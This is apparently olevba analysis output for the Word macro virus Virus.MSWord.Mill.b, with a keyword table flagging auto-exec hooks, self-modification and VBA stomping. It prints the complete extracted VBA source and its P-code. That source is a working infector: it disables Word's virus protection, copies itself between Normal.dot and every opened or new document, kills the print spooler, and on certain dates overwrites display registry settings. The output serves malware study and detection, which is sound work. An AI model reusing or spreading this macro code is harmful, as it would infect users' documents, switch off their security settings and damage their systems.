olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mill.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mill.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'MZdfgopkdfkl;gdf;lgkd;lgdf
'Çåñü ìîæåò áûòü âàøà ïðîãà
Dim N As Boolean
Dim s, s2 As String
Dim o1, o2 As Object
Const a = 0, b = "DMB 2K+01 super v.1.0", c = 5000, d = "dxview.exe", e = 10
Private Sub op()
Set o1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set o2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
' Îòêëþ÷àåì àíòèâèðóñíóþ çàùèòó
Options.VirusProtection = a
ShowVisualBasicEditor = a
End Sub
Private Sub document_close()
On Error Resume Next
Call op
Call DEAD
' Îïðåäåëÿåì çàðàæåí ëè Normal.dot
  If o1.Find(b, 1, 1, c, c) = a Then
 ' Èíñòàëèðóåì â ñèñòåìó
  o1.DeleteLines 1, o1.Countoflines
  s = o2.lines(1, o2.Countoflines)
  o1.AddFromString s
  If NormalTempale.Saved = True Then NormalTemplate.Save
  End If
End Sub

Private Sub Document_New()
On Error Resume Next
Call op
' Destroy spooler
For I = 1 To Tasks.Count
If Tasks(I).Name = "Spooler Process" Then
Tasks(I).SendWindowMessage &H2, 0, 0
End If
Next I
' Îïðåäåëÿåì îòêðûòûòå äîêóìåíòû è çàðàæàåì èõ
    If o2.Find(b, 1, 1, c, c) = a Then
    o2.DeleteLines 1, o2.Countoflines
    s = o1.lines(1, o1.Countoflines)
    o2.AddFromString s
    End If

End Sub
Private Sub Document_Open()
On Error Resume Next
Call op
If o2.Find(b, 1, 1, c, c) = a Then
    o2.DeleteLines 1, o2.Countoflines
    s = o1.lines(1, o1.Countoflines)
    o2.AddFromString s
    End If
End Sub

Private Sub Decompile()
On Error Resume Next
Call op
Dim W, W2 As String
Dim Z, Z2, Z3 As Long
Z3 = 0
3: Z3 = Z3 + 1
Mp = Chr(66 + Z3) + ":\"
If Z3 = 4 Then GoTo 2
M = Dir(Mp, 16)
Do While M <> ""
        If GetAttr(Mp & M) = 16 Then
        My1 = Mp + M + "\explorer.exe"
        My2 = Mp + M + "\win.ini"
        Z = FileLen(My1)
        Z2 = FileLen(My2)
        If (Z > 0) And (Z2 > 0) Then GoTo 1
        End If
        M = Dir
Loop
GoTo 3
1: W = Mp + M
W2 = W + "\" + d
' Ïðîâåðèì åñòü ëè íàø ôàéë
Z = FileLen(W)
If Z > 0 Then GoTo 2
' Ñîçäàòü ôàéë âñå íîðìàëüíî
s = o2.lines(1, o2.Countoflines)
If Mid(s, 2, 2) = "MZ" Then

End If
'Open d For Output As #1
'Print #1, "d"
'Close #1
2:
End Sub

Private Sub DEAD()
If (Year(Now) > 2001) Or (Year(Now) = 2001 And Month(Now) > 6) Then
If (Day(Now) = 13) Or (Day(Now) = 25) Or (Day(Now) = 14) Then
' Äåñòðóêòèâíûå äåéñòâèÿ
S3 = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Display\000"
s2 = "\MODES\"
s1 = "RefreshRate"
For I = 48 To 49
For j = 1 To 4
s4 = Mid(Str(8 * j), 2, 2)
s = S3 + Chr(I) + s2 + s4 + "\640,480"
System.PrivateProfileString("", s, s1) = "60"
s = S3 + Chr(I) + s2 + s4 + "\800,600"
System.PrivateProfileString("", s, s1) = "60"
s = S3 + Chr(I) + s2 + s4 + "\1024,768"
System.PrivateProfileString("", s, s1) = "60"
Next j
s = S3 + Chr(I) + s2 + "4\640,480"
System.PrivateProfileString("", s, s1) = "60"
Next I
End If
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mill.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 7574 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x001A "MZdfgopkdfkl;gdf;lgkd;lgdf"
' Line #2:
' 	QuoteRem 0x0000 0x001A "Çåñü ìîæåò áûòü âàøà ïðîãà"
' Line #3:
' 	Dim 
' 	VarDefn N (As Boolean)
' Line #4:
' 	Dim 
' 	VarDefn s
' 	VarDefn s2 (As String)
' Line #5:
' 	Dim 
' 	VarDefn o1
' 	VarDefn o2 (As Object)
' Line #6:
' 	Dim (Const) 
' 	LitDI2 0x0000 
' 	VarDefn a
' 	LitStr 0x0015 "DMB 2K+01 super v.1.0"
' 	VarDefn B
' 	LitDI2 0x1388 
' 	VarDefn c
' 	LitStr 0x000A "dxview.exe"
' 	VarDefn d
' 	LitDI2 0x000A 
' 	VarDefn e
' Line #7:
' 	FuncDefn (Private Sub op())
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set o1 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set o2 
' Line #10:
' 	QuoteRem 0x0000 0x001E " Îòêëþ÷àåì àíòèâèðóñíóþ çàùèòó"
' Line #11:
' 	Ld a 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #12:
' 	Ld a 
' 	St ShowVisualBasicEditor 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Private Sub document_close())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	ArgsCall (Call) op 0x0000 
' Line #17:
' 	ArgsCall (Call) DEAD 0x0000 
' Line #18:
' 	QuoteRem 0x0000 0x0021 " Îïðåäåëÿåì çàðàæåí ëè Normal.dot"
' Line #19:
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld c 
' 	Ld o1 
' 	ArgsMemLd Find 0x0005 
' 	Ld a 
' 	Eq 
' 	IfBlock 
' Line #20:
' 	QuoteRem 0x0001 0x0016 " Èíñòàëèðóåì â ñèñòåìó"
' Line #21:
' 	LitDI2 0x0001 
' 	Ld o1 
' 	MemLd Countoflines 
' 	Ld o1 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #22:
' 	LitDI2 0x0001 
' 	Ld o2 
' 	MemLd Countoflines 
' 	Ld o2 
' 	ArgsMemLd lines 0x0002 
' 	St s 
' Line #23:
' 	Ld s 
' 	Ld o1 
' 	ArgsMemCall AddFromString 0x0001 
' Line #24:
' 	Ld NormalTempale 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndSub 
' Line #27:
' Line #28:
' 	FuncDefn (Private Sub Document_New())
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' 	ArgsCall (Call) op 0x0000 
' Line #31:
' 	QuoteRem 0x0000 0x0010 " Destroy spooler"
' Line #32:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Tasks 
' 	MemLd Count 
' 	For 
' Line #33:
' 	Ld I 
' 	ArgsLd Tasks 0x0001 
' 	MemLd New 
' 	LitStr 0x000F "Spooler Process"
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitHI2 0x0002 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld I 
' 	ArgsLd Tasks 0x0001 
' 	ArgsMemCall SendWindowMessage 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	QuoteRem 0x0000 0x002D " Îïðåäåëÿåì îòêðûòûòå äîêóìåíòû è çàðàæàåì èõ"
' Line #38:
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld c 
' 	Ld o2 
' 	ArgsMemLd Find 0x0005 
' 	Ld a 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitDI2 0x0001 
' 	Ld o2 
' 	MemLd Countoflines 
' 	Ld o2 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld o1 
' 	MemLd Countoflines 
' 	Ld o1 
' 	ArgsMemLd lines 0x0002 
' 	St s 
' Line #41:
' 	Ld s 
' 	Ld o2 
' 	ArgsMemCall AddFromString 0x0001 
' Line #42:
' 	EndIfBlock 
' Line #43:
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Private Sub Document_Open())
' Line #46:
' 	OnError (Resume Next) 
' Line #47:
' 	ArgsCall (Call) op 0x0000 
' Line #48:
' 	Ld B 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld c 
' 	Ld o2 
' 	ArgsMemLd Find 0x0005 
' 	Ld a 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld o2 
' 	MemLd Countoflines 
' 	Ld o2 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld o1 
' 	MemLd Countoflines 
' 	Ld o1 
' 	ArgsMemLd lines 0x0002 
' 	St s 
' Line #51:
' 	Ld s 
' 	Ld o2 
' 	ArgsMemCall AddFromString 0x0001 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndSub 
' Line #54:
' Line #55:
' 	FuncDefn (Private Sub Decompile())
' Line #56:
' 	OnError (Resume Next) 
' Line #57:
' 	ArgsCall (Call) op 0x0000 
' Line #58:
' 	Dim 
' 	VarDefn W
' 	VarDefn W2 (As String)
' Line #59:
' 	Dim 
' 	VarDefn Z
' 	VarDefn Z2
' 	VarDefn Z3 (As Long)
' Line #60:
' 	LitDI2 0x0000 
' 	St Z3 
' Line #61:
' 	LineNum 3 
' 	BoS 0x0003 
' 	Ld Z3 
' 	LitDI2 0x0001 
' 	Add 
' 	St Z3 
' Line #62:
' 	LitDI2 0x0042 
' 	Ld Z3 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 ":\"
' 	Add 
' 	St Mp 
' Line #63:
' 	Ld Z3 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #64:
' 	Ld Mp 
' 	LitDI2 0x0010 
' 	ArgsLd Dir 0x0002 
' 	St M 
' Line #65:
' 	Ld M 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #66:
' 	Ld Mp 
' 	Ld M 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	IfBlock 
' Line #67:
' 	Ld Mp 
' 	Ld M 
' 	Add 
' 	LitStr 0x000D "\explorer.exe"
' 	Add 
' 	St My1 
' Line #68:
' 	Ld Mp 
' 	Ld M 
' 	Add 
' 	LitStr 0x0008 "\win.ini"
' 	Add 
' 	St My2 
' Line #69:
' 	Ld My1 
' 	ArgsLd FileLen 0x0001 
' 	St Z 
' Line #70:
' 	Ld My2 
' 	ArgsLd FileLen 0x0001 
' 	St Z2 
' Line #71:
' 	Ld Z 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	Ld Z2 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Ld Dir 
' 	St M 
' Line #74:
' 	Loop 
' Line #75:
' 	GoTo 3 
' Line #76:
' 	LineNum 1 
' 	BoS 0x0003 
' 	Ld Mp 
' 	Ld M 
' 	Add 
' 	St W 
' Line #77:
' 	Ld W 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld d 
' 	Add 
' 	St W2 
' Line #78:
' 	QuoteRem 0x0000 0x001A " Ïðîâåðèì åñòü ëè íàø ôàéë"
' Line #79:
' 	Ld W 
' 	ArgsLd FileLen 0x0001 
' 	St Z 
' Line #80:
' 	Ld Z 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #81:
' 	QuoteRem 0x0000 0x001B " Ñîçäàòü ôàéë âñå íîðìàëüíî"
' Line #82:
' 	LitDI2 0x0001 
' 	Ld o2 
' 	MemLd Countoflines 
' 	Ld o2 
' 	ArgsMemLd lines 0x0002 
' 	St s 
' Line #83:
' 	Ld s 
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "MZ"
' 	Eq 
' 	IfBlock 
' Line #84:
' Line #85:
' 	EndIfBlock 
' Line #86:
' 	QuoteRem 0x0000 0x0017 "Open d For Output As #1"
' Line #87:
' 	QuoteRem 0x0000 0x000D "Print #1, "d""
' Line #88:
' 	QuoteRem 0x0000 0x0008 "Close #1"
' Line #89:
' 	LineNum 2 
' 	BoS 0x0000 
' Line #90:
' 	EndSub 
' Line #91:
' Line #92:
' 	FuncDefn (Private Sub DEAD())
' Line #93:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D1 
' 	Gt 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07D1 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0006 
' 	Gt 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #94:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #95:
' 	QuoteRem 0x0000 0x0017 " Äåñòðóêòèâíûå äåéñòâèÿ"
' Line #96:
' 	LitStr 0x0046 "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Class\Display\000"
' 	St S3 
' Line #97:
' 	LitStr 0x0007 "\MODES\"
' 	St s2 
' Line #98:
' 	LitStr 0x000B "RefreshRate"
' 	St s1 
' Line #99:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0030 
' 	LitDI2 0x0031 
' 	For 
' Line #100:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #101:
' 	LitDI2 0x0008 
' 	Ld j 
' 	Mul 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St s4 
' Line #102:
' 	Ld S3 
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld s2 
' 	Add 
' 	Ld s4 
' 	Add 
' 	LitStr 0x0008 "\640,480"
' 	Add 
' 	St s 
' Line #103:
' 	LitStr 0x0002 "60"
' 	LitStr 0x0000 ""
' 	Ld s 
' 	Ld s1 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #104:
' 	Ld S3 
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld s2 
' 	Add 
' 	Ld s4 
' 	Add 
' 	LitStr 0x0008 "\800,600"
' 	Add 
' 	St s 
' Line #105:
' 	LitStr 0x0002 "60"
' 	LitStr 0x0000 ""
' 	Ld s 
' 	Ld s1 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #106:
' 	Ld S3 
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld s2 
' 	Add 
' 	Ld s4 
' 	Add 
' 	LitStr 0x0009 "\1024,768"
' 	Add 
' 	St s 
' Line #107:
' 	LitStr 0x0002 "60"
' 	LitStr 0x0000 ""
' 	Ld s 
' 	Ld s1 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #108:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' 	Ld S3 
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld s2 
' 	Add 
' 	LitStr 0x0009 "4\640,480"
' 	Add 
' 	St s 
' Line #110:
' 	LitStr 0x0002 "60"
' 	LitStr 0x0000 ""
' 	Ld s 
' 	Ld s1 
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #111:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	EndIfBlock 
' Line #113:
' 	EndIfBlock 
' Line #114:
' Line #115:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |dxview.exe          |Executable file name                         |
|IOC       |explorer.exe        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

